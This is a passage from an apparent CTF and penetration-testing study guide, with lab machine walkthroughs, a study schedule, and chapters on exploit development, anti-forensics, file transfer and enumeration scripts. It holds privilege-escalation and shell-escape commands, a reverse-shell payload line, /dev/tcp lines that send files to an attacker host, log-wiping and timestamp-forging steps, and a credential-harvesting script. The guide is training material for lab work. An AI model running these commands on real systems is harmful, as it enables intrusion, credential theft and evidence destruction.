  wpscan brute: wpscan --url http://dc-2 -U users.txt -P /tmp/cewl.txt
  Found: jerry:adipiscing, tom:parturient

  WordPress admin → Appearance → Editor → edit 404.php → PHP shell
  → Shell as www-data (OR)
  SSH as tom with found password → rbash restricted shell!

  rbash escape:
    BASH_CMDS[a]=/bin/bash; a   → escape restricted shell

  su jerry → sudo -l:
    (root) NOPASSWD: /usr/bin/git
  GTFOBins git → sudo git -p help config → !/bin/bash → ROOT

Book chapters: Ch 0b.2 (WordPress + cewl), Ch 15 (sudo git GTFOBins)

SUDO GIT EXPLOIT (add to notes):
  sudo git -p help config
  # When pager opens, type:
  !/bin/bash
  # ROOT shell!
  
  Or: sudo git branch --help    (same effect via pager)
```

---

**HackLAB Vulnix** — `https://www.vulnhub.com/entry/hacklab-vulnix,48/`

```
DIFFICULTY: Intermediate    THE BEST NFS MACHINE

Techniques: SMTP user enum → SSH brute → NFS no_root_squash

  nmap → SMTP + SSH + NFS (showmount reveals /home/vulnix)
  SMTP user enum:
    smtp-user-enum -M VRFY -U names.txt -t TARGET
    → Found: vulnix
  SSH brute force (vulnix):
    hydra -l vulnix -P rockyou.txt ssh://TARGET -t 4
    → Found password

  SSH as vulnix → low privilege shell

  NFS enumeration (from attacker):
    showmount -e TARGET
    → /home/vulnix *(rw,root_squash)   ← root_squash ON (safe)
    → /home/user   *(rw,no_root_squash) ← no_root_squash! VULNERABLE!

  NFS exploit:
    sudo mount -t nfs TARGET:/home/user /mnt/nfs
    sudo cp /bin/bash /mnt/nfs/
    sudo chmod +s /mnt/nfs/bash
    sudo chown root:root /mnt/nfs/bash
    (on target as vulnix):
    /home/user/bash -p → ROOT!

Book chapters: Ch 19 (NFS complete), Ch 0d.3 (SSH brute)

WHY THIS MACHINE:
  The DEFINITIVE NFS exploitation practice machine.
  Do this machine specifically to cement Chapter 19.
  After this machine, NFS enumeration becomes second nature.
```

---

**Stapler** — `https://www.vulnhub.com/entry/stapler-1,150/`

```
DIFFICULTY: Intermediate    BEST MULTI-SERVICE MACHINE

Techniques: FTP + SMB + HTTP + SSH + MySQL — covers EVERYTHING

  nmap → FTP (21), SSH (22), DNS (53), HTTP (80), HTTPS (443),
          SMB (139/445), MySQL (3306), HTTP alt (12380)

  FTP anonymous → find note.txt → username hint
  SMB → smbclient → find wordlist in a share
  HTTP on 12380 → HTTPS → gobuster → /admin112233/ (WordPress!)
  WordPress → wpscan → brute with found wordlist
  WordPress admin → PHP reverse shell in plugin
  Shell as www-data

  Privesc (multiple paths):
    Path A: Kernel exploit (Ubuntu 16.04)
    Path B: sudo -l for different users (su to them first)
    Path C: MySQL root → write SSH key
    Path D: Cron job running script

Book chapters: Ch 0c.1 (FTP), Ch 0c.2 (SMB), Ch 0b.2 (WordPress),
               All privesc chapters

WHY THIS MACHINE:
  Forces you to enumerate EVERYTHING before picking an attack path.
  Real engagements look like this — many services, you choose the path.
  Do after completing DC-1, DC-2, and simpler machines.
```

---

**Mr-Robot** — `https://www.vulnhub.com/entry/mr-robot-1,151/`

```
DIFFICULTY: Intermediate

Techniques: robots.txt wordlist → WordPress brute → PHP shell → SUID nmap

  nmap → HTTP + HTTPS
  robots.txt → key-1-of-3.txt + fsocity.dic (10k word wordlist!)
  Deduplicate wordlist: sort -u fsocity.dic > fsocity_unique.txt
  wpscan user enum → found: elliot
  Hydra/wpscan brute with fsocity_unique.txt → get password
  WordPress → Appearance → Editor → edit 404.php → PHP reverse shell
  Shell as daemon

  As daemon → find /home → /home/robot/password.raw-md5
  Crack: hash f3005a0f3c4b5e24b7b70c72f0e70adf → found via hashcat or crackstation.net
  su robot → second key

  find SUID: find / -perm -u=s -type f 2>/dev/null
  → /usr/local/bin/nmap (old version with --interactive)
  nmap --interactive → !sh → ROOT → third key

Book chapters: Ch 11.3.7 (SUID nmap --interactive), Ch 0b.2 (WordPress)
```

---

**pwnlab_init** — `https://www.vulnhub.com/entry/pwnlab-init,158/`

```
DIFFICULTY: Intermediate

Techniques: LFI → config file → image upload bypass → LFI RCE chain

  nmap → HTTP + MySQL
  Web app: ?page= parameter → LFI!
  LFI to read config.php:
    ?page=php://filter/convert.base64-encode/resource=config.php
    base64 decode → DB credentials
  MySQL login → nothing useful directly
  Web app login → upload image with PHP code + GIF magic bytes
  LFI to include uploaded image → RCE!
  Shell → privesc via SUID binary or su with found creds

Book chapters: Ch 0b.3.2 (LFI + PHP wrappers), Ch 0b.3.5 (file upload)

WHY THIS MACHINE:
  The LFI + file upload combination is extremely common in CTFs.
  This machine teaches the exact chain: LFI reads config → get creds
  → login → upload PHP in image → LFI to execute PHP → shell.
```

---

# Chapter 43: The Recommended Learning Schedule

## 43.1 Complete Week-by-Week Plan

```
WEEK 1 — Linux Fundamentals
  Monday:    OverTheWire Bandit levels 0-10
  Tuesday:   OverTheWire Bandit levels 11-20
  Wednesday: THM Linux Fundamentals Part 1 + 2
  Thursday:  THM Linux Fundamentals Part 3 + Network Services
  Friday:    THM Network Services 2
  Weekend:   Review Chapter 1-3 of this book
             Try: HTB Starting Point Meow, Fawn, Dancing (30 min each)

WEEK 2 — Web Vulnerabilities
  Monday:    THM OWASP Top 10 (tasks 1-5)
  Tuesday:   THM OWASP Top 10 (tasks 6-10)
  Wednesday: THM File Inclusion (full room)
  Thursday:  THM SQL Injection Lab
  Friday:    THM Upload Vulnerabilities + Burp Suite Basics
  Weekend:   THM Pickle Rick (apply web skills)
             HTB Starting Point Tier 0: Preignition + Appointment

WEEK 3 — Core Privilege Escalation
  Monday:    Read Chapters 11-12 (SUID, Capabilities)
             THM Linux PrivEsc — Tasks 1-4 (SUID + capabilities)
  Tuesday:   Read Chapter 15 (Sudo)
             THM Linux PrivEsc — Tasks 5-7 (sudo tasks)
  Wednesday: Read Chapter 13 (Cron)
             THM Linux PrivEsc — Tasks 8-10 (cron, PATH)
  Thursday:  Read Chapter 19 (NFS)
             THM Linux PrivEsc — Task 11 (NFS) + Task 12 (kernel)
  Friday:    THM Linux PrivEsc Arena (full unguided room)
  Weekend:   THM RootMe + THM Simple CTF (full machines)
             HTB Starting Point Tier 1: Sequel + Crocodile

WEEK 4 — Integration (Chaining Techniques)
  Monday:    THM LazyAdmin (credential hunting + sudo)
  Tuesday:   THM Ignite (CMS + credential reuse)
  Wednesday: THM Skynet (SMB + cron wildcard)
  Thursday:  THM Agent Sudo (CVE sudo bypass)
  Friday:    THM Vulnversity (file upload + SUID systemctl)
  Weekend:   VulnHub Kioptrix Level 1 (first VulnHub machine!)
             HTB Starting Point Tier 1: Responder + Three

WEEK 5 — First Unguided Machines
  Monday-Wednesday: VulnHub Kioptrix Level 2 (SQLi + kernel)
  Thursday-Friday:  VulnHub Kioptrix Level 3 (creative sudo)
  Weekend:          VulnHub Kioptrix Level 4 (MySQL UDF)
                    THM Mr Robot CTF (medium difficulty)

WEEK 6-7 — Intermediate VulnHub
  VulnHub DC-1 (Drupal + SUID find)
  VulnHub DC-2 (WordPress + sudo git)
  VulnHub DC-3 (Joomla + kernel)
  VulnHub Mr-Robot
  HTB Starting Point Tier 2 all machines

WEEK 8-10 — HTB Retired + Advanced VulnHub
  HTB Shocker (Shellshock + sudo perl)
  HTB Bashed (phpbash + cron multi-step)
  HTB Nibbles (WordPress + writable sudo script)
  HTB Cronos (DNS zone transfer + SQL + cron)
  VulnHub HackLAB Vulnix (NFS — CRITICAL)
  VulnHub Stapler (multi-service)
  THM Daily Bugle (Joomla + hashcat + sudo yum)

MONTH 3+ — Advanced Practice
  HTB Retired Medium Linux machines
  Build your own lab (Metasploitable, DVWA, custom VMs)
  Begin working on OSCP-style practice (TryHackMe OSCP path)
  Consider: HTB Pro Labs (paid) or eLearnSecurity courses
```

## 43.2 The IppSec Method — Video Learning Done Right

IppSec (https://www.youtube.com/@ippsec) has walkthroughs for essentially every HTB retired machine. His videos are the single best free resource for advanced technique learning.

```
HOW TO USE IPPSEC CORRECTLY:

1. Attempt the machine yourself (minimum 1-2 hours)
2. Take notes on everything you found and tried
3. After completing OR after genuine exhaustion:
   → Watch the IppSec video from start to finish
4. Pause the video when he does something you didn't think of
5. Write down: "I missed X because I didn't check Y"
6. Identify 1-2 techniques to add to your methodology

NEVER watch IppSec BEFORE attempting the machine.
The purpose is to see what you missed, not to follow along.

GOOD THINGS TO NOTE FROM IPPSEC VIDEOS:
  → Command shortcuts that save time
  → Tools you didn't know existed
  → Enumeration steps you skipped
  → Alternative paths you could have taken
  → Why the misconfiguration exists (the defensive perspective)

IppSec also has a search tool: https://ippsec.rocks
Search by technique: "cron injection", "SUID python", "lxd escape"
→ Instantly find machines that use that specific technique
→ Use this when you want to practice a specific vector
```

## 43.3 Building Your Personal Note System

The best hackers have a personal knowledge base. After every machine, add to it.

```
RECOMMENDED TOOL: Obsidian (free, offline, markdown)
Download: https://obsidian.md/

FOLDER STRUCTURE:
notes/
├── techniques/
│   ├── suid_exploitation.md
│   ├── sudo_misconfigs.md
│   ├── cron_exploitation.md
│   ├── lfi_to_rce.md
│   └── nfs_no_root_squash.md
├── tools/
│   ├── nmap_cheatsheet.md
│   ├── gobuster_cheatsheet.md
│   └── hydra_cheatsheet.md
├── machines/
│   ├── thm_rootme.md
│   ├── htb_bashed.md
│   └── vulnhub_dc1.md
└── payloads/
    ├── reverse_shells.md
    └── privesc_oneliners.md

TEMPLATE FOR EACH MACHINE:
# Machine Name (Platform, Difficulty)

## Tags
#suid #cron #wordpress #lfi #medium

## Summary
One paragraph: what the machine was about, what techniques were used.

## Initial Access
- How I found the vulnerability
- What the vulnerability was
- Exact commands I used

## Privilege Escalation
- What I found during enumeration
- Which vector I exploited and why
- Exact commands

## What I Missed / Could Have Been Faster
- X: I spent 30 min on Y when Z was simpler
- Should have checked /opt/ earlier

## New Techniques Learned
- [Technique]: [How it works] [When to use it]

## Commands I'll Reuse
- Exact command 1
- Exact command 2
```

---

# ⚡ BONUS CHAPTERS — What Puts You Ahead of Everyone Else

> These chapters cover the techniques, mindset, and meta-skills that separate someone who can follow a walkthrough from someone who can solve any machine cold, write their own exploits, stay invisible, and build tools others don't have.

---

# Bonus A — The Mindset Edge

## A.1 How the Top 1% of CTF Players Think Differently

Most players think in terms of **tools**. The top players think in terms of **questions**.

```
Average player mindset:
  "I ran linpeas. Now what do I do with the output?"
  "I found a SUID binary — let me check GTFOBins."
  "Sudo -l shows nothing — I'm stuck."

Top player mindset:
  "Why does this SUID binary exist? Who put it here? What does it DO?"
  "GTFOBins has nothing on this binary — so what CAN this binary do?"
  "Sudo -l shows nothing NOW — but what runs as root? What WILL run?"
```

The difference is **curiosity applied systematically**. Every finding is a question, not an answer.

## A.2 The Five Questions That Unlock Every Box

Before touching any tool, ask these about the machine:

```
1. WHAT runs as root on this machine?
   → Processes, cron jobs, systemd services, scheduled tasks
   → Answer: ps aux, pspy, systemctl, crontab

2. WHAT can I write to that root will later read or execute?
   → Cron scripts, config files, log files, library paths, PATH entries
   → Answer: find / -writable + cross-reference with running processes

3. WHAT executes my input without proper sanitization?
   → Web forms, environment variables, filename handling, log entries
   → Answer: test EVERY input with ; id and ../../../

4. WHAT am I allowed to do that is more powerful than intended?
   → Sudo rules, group memberships, capabilities, SUID ownership
   → Answer: sudo -l, id, getcap -r /

5. WHAT secrets has someone left behind?
   → History files, config files, backup files, git repos, memory
   → Answer: credential hunting (Chapter 33)
```

If you cannot answer all five after enumeration, you have not enumerated enough.

## A.3 The "Assume Nothing" Principle

```
WRONG: "Port 22 is SSH. I can't do anything with SSH without credentials."
RIGHT: "Port 22 is SSH. Let me check:
        - What version? Any CVEs?
        - Does it accept keys? Any public keys I can find?
        - Can I enumerate users via timing attack?
        - Is the default host key still in use?
        - What ciphers are supported? (ssh-audit)
        - Can it be used for tunneling once I'm inside?"

WRONG: "I don't have sudo. That vector is closed."
RIGHT: "Sudo -l requires no password to run — what does it show?
        Is there a token cached? Can I read /run/sudo/ts/?
        What will root execute NEXT? Can I intercept that execution?"

WRONG: "The kernel is patched. Kernel exploits won't work."
RIGHT: "The kernel is patched against known CVEs. Are there:
        - Custom kernel modules loaded? (lsmod)
        - Kernel parameters I can influence?
        - Race conditions in the specific version?
        - Unsigned modules that can be loaded?"
```

## A.4 Time Management During CTFs

```
FIRST 5 MINUTES: Breadth scan — find all attack surface
  nmap -p- fast scan, start gobuster if HTTP, check obvious services

NEXT 15 MINUTES: Initial access — what looks most promising?
  Attack the highest-value target from your scan
  If web: gobuster + whatweb + source code simultaneously

NEXT 20 MINUTES: If stuck on initial access, try other services
  Don't spend 45 minutes on one path — pivot after 20 min of nothing

AFTER GETTING SHELL: 3 minutes of immediate wins
  id, sudo -l, uname -r, env — these 4 lines take 10 seconds each

PRIVESC: Work the decision tree, don't guess
  Follow Chapter 36 exactly. Don't skip steps.

IF COMPLETELY STUCK (30+ min after good enumeration):
  1. Re-examine nmap output — did you miss a port?
  2. Check vhosts — curl -H "Host: something.target.htb" TARGET
  3. Run pspy — what is root executing right now?
  4. Check /proc/net/tcp for listening services not visible via ss
  5. Read every found file — not just the ones that look interesting
```

## A.5 Reading /proc Like a Pro

`/proc` is a goldmine that most players ignore after the first week:

```bash
# Find ALL listening ports including those bound to localhost
# (sometimes ss/netstat miss these or require root to show PID)
cat /proc/net/tcp | awk 'NR>1 {print $2}' | while read hex; do
    port=$(echo "obase=10; ibase=16; ${hex##*:}" | bc)
    echo "Port: $port"
done | sort -t: -k2 -n | uniq

# Read any process's environment (root processes included if world-readable!)
for pid in /proc/[0-9]*/environ; do
    echo "=== $pid ==="
    cat "$pid" 2>/dev/null | tr '\0' '\n' | grep -iE "pass|secret|key|token"
done

# See what files every process has open
ls -la /proc/*/fd 2>/dev/null | grep -v "^total\|^d" | head -50

# Read command line of all processes (reveals passwords passed as args!)
for pid in /proc/[0-9]*/cmdline; do
    content=$(cat "$pid" 2>/dev/null | tr '\0' ' ')
    echo "$content" | grep -iE "pass|secret|key|token|--password|-p " && echo "  ^ from $pid"
done

# Check memory maps for loaded libraries (find custom libs)
cat /proc/$(pgrep -f "interesting_process")/maps 2>/dev/null

# Read process memory directly (if permissions allow)
pid=$(pgrep mysqld)
cat /proc/$pid/mem 2>/dev/null | strings | grep -i "password" | head -10
```

---

# Bonus B — Custom Exploit Development Basics

## B.1 When to Write Your Own Exploit

You need custom exploit skills when:
- The binary is completely custom (no CVE exists)
- The exploit exists but targets a different version/offset
- You found a vulnerability through source code review
- The existing PoC is broken and needs fixing

## B.2 Buffer Overflow Basics (Stack-Based)

```bash
# Step 1: Check if binary is vulnerable to overflow
# Send increasing lengths of input until crash:
python3 -c 'print("A" * 100)' | ./vulnerable_binary
python3 -c 'print("A" * 500)' | ./vulnerable_binary
python3 -c 'print("A" * 1000)' | ./vulnerable_binary
# If it crashes with a long input: likely buffer overflow!

# Step 2: Find exact crash offset using cyclic pattern (pwntools):
python3 -c "
from pwn import *
pattern = cyclic(500)
print(pattern.decode())
" | ./vulnerable_binary
# Note the value in EIP/RIP when it crashes

# Step 3: Find the offset:
python3 -c "
from pwn import *
# Replace with the EIP value you saw at crash:
offset = cyclic_find(0x61616175)
print(f'Offset: {offset}')
"

# Step 4: Check binary protections:
checksec --file=./vulnerable_binary
# NX disabled + No PIE + No canary = classic ret2shellcode
# NX enabled = need ROP chain
# ASLR: check /proc/sys/kernel/randomize_va_space

# Step 5: Find gadgets for ROP if needed:
ROPgadget --binary ./vulnerable_binary | grep "pop rdi"
ropper -f ./vulnerable_binary --search "pop rdi"
```

## B.3 Format String Vulnerabilities

```bash
# Detection: does the program print your input directly?
echo "%x %x %x %x" | ./vulnerable_binary
# If you see hex values instead of literal "%x": FORMAT STRING BUG!

# Read arbitrary memory (find stack values, canaries, pointers):
echo "%1\$x %2\$x %3\$x %4\$x %5\$x %6\$x %7\$x %8\$x" | ./binary

# Read a specific address (AAAA = 0x41414141 as marker):
python3 -c 'import sys; sys.stdout.buffer.write(b"AAAA" + b".%x" * 20 + b"\n")' | ./binary
# Count the positions until you see 41414141 — that's your offset

# Write to arbitrary address (overwrite GOT entry, return address, etc.):
# This requires pwntools for practical use:
python3 << 'EOF'
from pwn import *

p = process('./vulnerable_binary')
# Write 0x1337 to address 0x804a010:
target = 0x804a010
value = 0x1337
payload = fmtstr_payload(6, {target: value})
p.sendline(payload)
p.interactive()
EOF
```

## B.4 Using pwntools for Exploit Development

```python
#!/usr/bin/env python3
# skeleton_exploit.py — template for binary exploitation
from pwn import *

# Target configuration
binary = './vulnerable_binary'
elf = ELF(binary)
context.binary = elf
context.arch = 'amd64'   # or 'i386'
# context.log_level = 'debug'  # Uncomment for verbose output

# Remote or local?
def get_target():
    if args.REMOTE:
        return remote('TARGET_IP', PORT)
    else:
        return process(binary)

p = get_target()

# Useful pwntools helpers:
# p.recvline()          — receive one line
# p.recvuntil(b":")     — receive until pattern
# p.send(payload)       — send without newline
# p.sendline(payload)   — send with newline
# p.interactive()       — manual interaction mode
# p64(address)          — pack 64-bit little-endian address
# p32(address)          — pack 32-bit little-endian address
# u64(bytes)            — unpack 64-bit address
# asm(shellcode)        — assemble shellcode

# Basic buffer overflow template:
offset = 40  # Find this with cyclic pattern
ret_addr = p64(0xdeadbeef)  # Address to jump to

payload = b"A" * offset
payload += ret_addr

p.sendline(payload)
p.interactive()
```

## B.5 Shellcode Basics

```python
# Generate shellcode with pwntools:
from pwn import *
context.arch = 'amd64'
context.os = 'linux'

# Spawn /bin/sh:
shellcode = asm(shellcraft.sh())
print(shellcode.hex())

# Or use msfvenom:
# msfvenom -p linux/x64/exec CMD=/bin/bash -f python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f raw | xxd

# Test shellcode locally:
from pwn import *
context.arch = 'amd64'
shellcode = asm(shellcraft.sh())
# Run it in a process:
p = process('/bin/bash')  # Replace with target
p.sendline(shellcode)
p.interactive()
```

---

# Bonus C — Stealth & Anti-Forensics

## C.1 Covering Your Tracks (Post-Exploitation)

> Note: These techniques are documented for defensive awareness — understanding what attackers do helps defenders detect it. Only use on authorized targets.

```bash
# ===== HIDING YOUR PRESENCE =====

# Clear your bash history:
history -c && history -w    # Clear in-memory + write empty to file
unset HISTFILE               # Stop logging history for this session
export HISTSIZE=0            # No history stored
export HISTFILESIZE=0

# More thorough:
cat /dev/null > ~/.bash_history
ln -sf /dev/null ~/.bash_history   # Link history to /dev/null permanently

# Remove specific lines from history:
history -d LINE_NUMBER       # Delete specific history entry

# Run commands without them appearing in history:
 command_here               # Leading space (if HISTCONTROL=ignorespace)
HISTFILE=/dev/null bash      # Spawn shell with no history

# ===== CLEARING LOGS =====

# Clear auth.log (SSH logins, sudo usage):
echo "" > /var/log/auth.log
> /var/log/auth.log          # Same effect

# Clear specific entries (more surgical):
grep -v "your_username\|your_ip" /var/log/auth.log > /tmp/clean.log
mv /tmp/clean.log /var/log/auth.log

# Watch logs in real time to know what's being written:
tail -f /var/log/auth.log
tail -f /var/log/syslog

# Files you should clear after a pentest (with permission):
/var/log/auth.log
/var/log/syslog
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/wtmp       # Login records (last command reads this)
/var/log/btmp       # Failed login attempts
/var/run/utmp       # Currently logged in users (who reads this)
~/.bash_history
~/.zsh_history
/tmp/*              # Any files you dropped

# Clear wtmp/btmp (binary files — use this):
> /var/log/wtmp
> /var/log/btmp

# ===== AVOIDING DETECTION =====

# Rename your tools to blend in:
cp linpeas.sh /tmp/update.sh
cp pspy64 /tmp/systemd-check

# Work in /dev/shm (RAM — doesn't survive reboot, no disk I/O):
cd /dev/shm
wget http://LHOST:8000/tool -O /dev/shm/tool
chmod +x /dev/shm/tool
./tool
# After you're done: it disappears on reboot automatically

# Run processes that blend in:
bash --norc --noprofile          # Looks like a normal bash
python3 -c "import time; time.sleep(99999)" &   # Looks innocuous

# Timestamps — restore file timestamps after modification:
# Before modifying a file, note its timestamp:
stat /etc/crontab   # Note: Access, Modify, Change times

# After modifying, restore the timestamp:
touch -r /etc/hosts /etc/crontab   # Copy timestamp from /etc/hosts
touch -t 202301011200 /etc/crontab  # Set specific timestamp
# (Format: YYYYMMDDhhmm)

# ===== WHAT DEFENDERS LOOK FOR =====
# Understanding this helps you on both sides:

# Unusual SUID files (defenders run):
find / -perm -4000 -newer /tmp -type f 2>/dev/null

# Recently modified system files:
find /etc /bin /usr/bin -mtime -1 2>/dev/null

# Unusual listening ports:
ss -tulpn | grep LISTEN

# Users with root shell (UID 0):
awk -F: '$3 == 0' /etc/passwd

# Cron jobs added recently:
find /etc/cron* /var/spool/cron -newer /etc/passwd 2>/dev/null

# New users:
awk -F: '$3 >= 1000' /etc/passwd   # Regular users
```

## C.2 Living Off The Land (LOLBins)

Use tools already on the system to avoid uploading suspicious binaries:

```bash
# File transfer without wget/curl:
# Using /dev/tcp:
cat < /dev/tcp/LHOST/PORT > /tmp/received_file   # Receive a file
cat file.txt > /dev/tcp/LHOST/PORT               # Send a file

# Using python (already installed):
python3 -m http.server 8080    # Serve files from current directory
python3 -c "
import urllib.request
urllib.request.urlretrieve('http://LHOST/tool', '/tmp/tool')
"

# Using perl:
perl -e 'use LWP::Simple; getstore("http://LHOST/tool", "/tmp/tool");'

# Using bash + /dev/tcp (no external tools):
exec 3<>/dev/tcp/LHOST/8000
echo -e "GET /linpeas.sh HTTP/1.0\r\n\r\n" >&3
cat <&3 | sed '1,/^\r$/d' > /tmp/linpeas.sh

# Base64 encode/decode for binary transfer via copy-paste:
# On attacker: base64 -w0 tool > tool.b64
# On victim: echo "BASE64..." | base64 -d > /tmp/tool

# Compress before encoding (larger files):
# gzip -c tool | base64 -w0 > tool.gz.b64
# echo "BASE64..." | base64 -d | gunzip > /tmp/tool
```

---

# Bonus D — Automation: Writing Your Own Enumeration Scripts

## D.1 Why Write Your Own Scripts?

Public tools like linpeas are known to defenders. Custom scripts:
- Evade signature-based detection
- Do exactly what YOU need, nothing else
- Teach you deeply what you're looking for
- Can be optimized for speed

## D.2 Your Personal Quick Enum Script

Build this up over time, adding things you find yourself reaching for:

```bash
#!/bin/bash
# myenum.sh — your personal quick enumeration script
# Add to this every time you find yourself typing the same thing twice

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

banner() { echo -e "\n${CYAN}════════════════════════════════${NC}"; echo -e "${YELLOW}  $1${NC}"; echo -e "${CYAN}════════════════════════════════${NC}"; }
found() { echo -e "${RED}[!] FOUND: $1${NC}"; }
info() { echo -e "${GREEN}[*] $1${NC}"; }

banner "IDENTITY"
id; whoami; groups
echo ""

banner "SUDO (most important!)"
sudo -l 2>/dev/null && found "SUDO PERMISSIONS EXIST — CHECK ABOVE"
sudo -n true 2>/dev/null && found "SUDO TOKEN CACHED — NO PASSWORD NEEDED"
echo ""

banner "SUID BINARIES"
SUID=$(find / -perm -u=s -type f 2>/dev/null)
echo "$SUID"
# Highlight non-standard SUID
echo "$SUID" | grep -vE "^/usr/bin/|^/bin/|^/usr/sbin/|^/sbin/" | while read f; do
    found "NON-STANDARD SUID: $f"
done
echo ""

banner "CAPABILITIES"
CAPS=$(getcap -r / 2>/dev/null)
echo "$CAPS"
echo "$CAPS" | grep -vE "^$" | while read c; do found "CAPABILITY: $c"; done
echo ""

banner "CRON JOBS"
cat /etc/crontab 2>/dev/null
ls -la /etc/cron.d/ 2>/dev/null
crontab -l 2>/dev/null
echo ""

banner "INTERESTING WRITABLE FILES"
find /etc -writable -type f 2>/dev/null | while read f; do found "WRITABLE: $f"; done
find / -perm -o+w -type f 2>/dev/null | grep -vE "/proc|/sys|/dev|/tmp|/run" | head -20
echo ""

banner "ENVIRONMENT"
env | grep -iE "pass|secret|key|token|api" | while read e; do found "ENV: $e"; done
echo $PATH | tr ':' '\n' | while read p; do
    ls -lad "$p" 2>/dev/null | grep -E "^d.{5}w|^d..w" && found "WRITABLE IN PATH: $p"
done
echo ""

banner "CREDENTIAL FILES"
for f in ~/.bash_history ~/.zsh_history ~/.mysql_history ~/.psql_history; do
    [ -r "$f" ] && echo "=== $f ===" && cat "$f" | grep -iE "pass|mysql|ssh|su " | head -10
done
find / -name ".env" -readable -type f 2>/dev/null | head -5 | while read f; do
    found "ENV FILE: $f"
    cat "$f" | grep -iE "pass|secret|key" | head -5
done
echo ""

banner "NETWORK (INTERNAL SERVICES)"
ss -tulpn 2>/dev/null | grep "127.0.0.1" | while read s; do found "LOCAL SERVICE: $s"; done
echo ""

banner "NFS"
[ -r /etc/exports ] && cat /etc/exports && found "NFS EXPORTS FOUND — CHECK no_root_squash"
showmount -e localhost 2>/dev/null
echo ""

banner "CONTAINERS"
[ -f /.dockerenv ] && found "INSIDE DOCKER CONTAINER"
id | grep -q "docker" && found "IN DOCKER GROUP"
id | grep -q "lxd" && found "IN LXD GROUP — CONTAINER ESCAPE POSSIBLE"
cat /proc/self/status | grep CapEff | grep -v "0000000000000000" | grep -q "3fff" && found "PRIVILEGED CONTAINER"
echo ""

banner "KERNEL"
uname -r
info "Search: 'linux kernel $(uname -r) exploit' or run linux-exploit-suggester"
echo ""

banner "INTERESTING FILES"
find /home /root /opt /var/www -name "*.txt" -readable 2>/dev/null | head -10
find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ed25519" 2>/dev/null | while read k; do
    found "SSH KEY: $k"
done
find / -name "*.bak" -o -name "*.old" -o -name "*.backup" 2>/dev/null | grep -vE "/proc|/sys" | head -10

echo -e "\n${GREEN}[*] Enumeration complete. Review [!] findings above first.${NC}"
```

```bash
# Save it and use it:
chmod +x myenum.sh
# Transfer and run on victim:
# python3 -m http.server 8000
# wget http://LHOST:8000/myenum.sh -O /tmp/me.sh && chmod +x /tmp/me.sh && /tmp/me.sh
```

## D.3 Automated Credential Extractor

```bash
#!/bin/bash
# credgrep.sh — hunt credentials everywhere

echo "[*] Searching history files..."
for f in /home/*/.bash_history /home/*/.zsh_history /root/.bash_history; do
    [ -r "$f" ] || continue
    echo "=== $f ==="
    grep -iE "pass|mysql|ssh|ftp|secret|key" "$f" 2>/dev/null | head -20
done

echo "[*] Searching config files..."
find / -readable -type f \( -name "*.conf" -o -name "*.config" -o -name "*.cfg" -o -name ".env" -o -name "*.ini" -o -name "*.xml" -o -name "*.yml" -o -name "*.yaml" \) 2>/dev/null | \
    grep -vE "/proc|/sys" | head -50 | while read f; do
    result=$(grep -iE "(password|passwd|secret|api_key|token|db_pass)\s*[=:]" "$f" 2>/dev/null | grep -v "#")
    [ -n "$result" ] && echo "=== $f ===" && echo "$result" | head -5
done

echo "[*] Searching web files..."
find /var/www /srv /opt -readable -type f -name "*.php" 2>/dev/null | head -30 | while read f; do
    result=$(grep -iE "(password|passwd|db_pass)\s*=\s*['\"]" "$f" 2>/dev/null)
    [ -n "$result" ] && echo "=== $f ===" && echo "$result" | head -3
done

echo "[*] Checking process environments..."
for pid in $(ls /proc | grep -E "^[0-9]+$"); do
    cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' | \
        grep -iE "pass|secret|token|key" | while read e; do
        echo "[PID $pid] $e"
    done
done
```

---

# Bonus E — The Unknown Binary Approach

## E.1 How to Approach Any Unknown SUID/Sudo Binary

When you find a custom binary with SUID set or allowed via sudo that isn't in GTFOBins, here is the **complete analytical methodology**:

```
STEP 1: RECONNAISSANCE ON THE BINARY
────────────────────────────────────
file /path/to/binary         # ELF type? 32 or 64-bit? Stripped?
strings /path/to/binary | less  # Embedded strings — passwords? paths? commands?
strings /path/to/binary | grep -E "^[a-z_]{3,}$"  # Short words = likely function/command names
ls -la /path/to/binary       # Owner? Permissions? When modified?
md5sum /path/to/binary       # Calculate hash to search online

STEP 2: DYNAMIC ANALYSIS — WHAT DOES IT DO?
─────────────────────────────────────────────
ltrace /path/to/binary 2>&1         # What library functions does it call?
strace /path/to/binary 2>&1         # What system calls does it make?
strace -e execve /path/to/binary 2>&1   # Does it exec another program?
strace -e open,openat /path/to/binary 2>&1  # What files does it open?

STEP 3: WHAT DOES IT CALL WITHOUT FULL PATH?
─────────────────────────────────────────────
# From strings output: look for command names without /
strings /path/to/binary | grep -v "/" | grep -E "^[a-z]" | sort -u
# From strace:
strace -e execve /path/to/binary 2>&1 | grep -v "^execve.*null"

STEP 4: CAN I CONTROL ITS INPUT?
──────────────────────────────────
# Test command injection via arguments:
/path/to/binary "test; id"
/path/to/binary "$(id)"
/path/to/binary "; id #"
/path/to/binary "' OR '1'='1"    # If it queries a DB

# Test via environment:
VAR="test; id" /path/to/binary
PATH=/tmp:$PATH /path/to/binary

# Test via files:
echo "; id #" > /tmp/input.txt
/path/to/binary /tmp/input.txt

STEP 5: DOES IT READ A WRITABLE CONFIG?
─────────────────────────────────────────
strace /path/to/binary 2>&1 | grep -E "open|openat" | grep -v "ENOENT" | grep -v "^open.*\"/"
# Look for config files in writable locations

STEP 6: BUFFER OVERFLOW POSSIBILITY?
──────────────────────────────────────
checksec --file=/path/to/binary    # Check protections
python3 -c 'print("A"*1000)' | /path/to/binary  # Does it crash?
# If no stack canary + no NX: classic overflow is possible
```

### E.2 Real Example Walkthrough

```bash
# You find: /usr/local/bin/admin_tool (owned by root, SUID set)
# It's not in GTFOBins. What do you do?

# Step 1: strings
strings /usr/local/bin/admin_tool | head -40
# Output includes:
# /usr/bin/service    ← calls service (but with full path? or not?)
# restart             ← argument?
# service %s restart  ← SPRINTF FORMAT! calls service $ARG — COMMAND INJECTION!
# Config: /etc/admin.conf  ← reads a config file

# Step 2: Check if /etc/admin.conf is writable
ls -la /etc/admin.conf
# -rw-rw-r-- 1 root staff /etc/admin.conf ← staff group writable!
id | grep staff    # You're in staff group!

# Step 3: Check what's in admin.conf
cat /etc/admin.conf
# service_name=nginx

# Step 4: The format string shows: service %s restart
